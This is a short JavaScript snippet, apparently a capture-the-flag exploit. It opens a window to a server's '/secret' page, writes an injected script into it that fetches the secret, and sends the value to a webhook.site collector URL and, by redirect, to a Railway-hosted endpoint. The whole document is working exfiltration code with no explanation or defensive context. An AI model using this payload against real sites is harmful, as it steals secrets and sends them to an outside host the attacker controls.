let value = window.open('http://20.235.243.131:8443/secret');
value.window.onload=()=>{
  value.window.document.write('<script>fetch("/secret").then(data=>data.text()).then(flag=>{fetch("https://webhook.site/4009b056-4f96-429d-aa35-e15cb9126dc0/?flag="+flag);window.location="https://fastapi-production-64ed.up.railway.app/bugbase?flag="+flag;})</script>');
}
